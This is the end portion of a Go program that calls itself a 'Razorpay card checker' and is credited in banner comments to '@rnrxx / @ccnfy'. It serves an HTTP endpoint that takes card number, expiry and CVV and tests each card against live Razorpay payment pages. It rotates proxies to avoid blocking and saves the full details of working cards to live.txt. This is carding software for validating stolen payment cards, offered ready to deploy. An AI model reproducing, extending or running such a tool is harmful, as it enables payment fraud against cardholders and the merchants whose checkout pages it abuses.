// ──────────────────────────────────────────────────────────────────────────────

func logLive(card *ParsedCard, result CheckResult) {
	if result.Status == "charged" || result.Status == "approved" {
		line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
			card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)

		liveLogMutex.Lock()
		f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString(line)
			f.Close()
		}
		liveLogMutex.Unlock()
	}
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
	first6 := card.CC
	if len(first6) > 6 {
		first6 = first6[:6]
	}
	last4 := card.CC
	if len(last4) > 4 {
		last4 = last4[len(last4)-4:]
	}
	middle := strings.Repeat("*", len(card.CC)-10)
	if len(middle) < 6 {
		middle = "******"
	}
	log.Printf("[%s] %s%s%s | %s | %s | Site: %s",
		strings.ToUpper(result.Status), first6, middle, last4,
		result.Message, proxyDisplay, targetURL)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func handler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	path := r.URL.Path
	re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
	match := re.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
			"proxy":    "N/A",
		})
		return
	}

	cardData, _ := url.QueryUnescape(match[1])
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid card format. Use: cc|mm|yy|cvv",
			"proxy":    "N/A",
		})
		return
	}

	proxyList := loadProxies("px.txt")
	proxy := getNextProxy(proxyList)
	targetURL := getNextURL()

	// High-load protection: limit concurrent heavy checks
	checkSemaphore <- struct{}{}
	defer func() { <-checkSemaphore }()

	result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)

	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
	logLive(card, result)
	logResult(card, result, proxyDisplay, targetURL)

	resp := map[string]string{
		"status":   result.Status,
		"response": result.Message,
		"proxy":    proxyDisplay,
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	json.NewEncoder(w).Encode(resp)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	// Load Razorpay URLs from sites.txt ( Railway friendly + easy to update )
	razorpayURLs = loadSites("sites.txt")
	if len(razorpayURLs) == 0 {
		log.Println("WARNING: No URLs found in sites.txt — using built-in default")
		razorpayURLs = []string{"https://pages.razorpay.com/lckuk-international"}
	}

	// Railway uses $PORT env var. Fallback to 7070 for local/dev
	portStr := os.Getenv("PORT")
	if portStr == "" {
		portStr = strconv.Itoa(PORT)
	}

	// Health check endpoint (useful for Railway monitoring)
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"status":  "ok",
			"service": "razorpay-checker",
		})
	})

	// Main handler
	http.HandleFunc("/", handler)

	addr := fmt.Sprintf("0.0.0.0:%s", portStr)

	log.Printf("=========================================================")
	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (High-Load Ready)")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
	log.Printf("  Health: /health")
	log.Printf("  Max concurrent checks: %d (protected)", maxConcurrentChecks)
	log.Printf("  Sites loaded from sites.txt: %d", len(razorpayURLs))
	log.Printf("  Proxies: loaded from px.txt (if present)")
	log.Printf("=========================================================")

	// Robust server config to prevent stuck/crash under load
	srv := &http.Server{
		Addr:         addr,
		Handler:      http.DefaultServeMux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 180 * time.Second, // generous because one check can take 30-90s
		IdleTimeout:  120 * time.Second,
	}

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server failed: %v", err)
	}
}


// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────
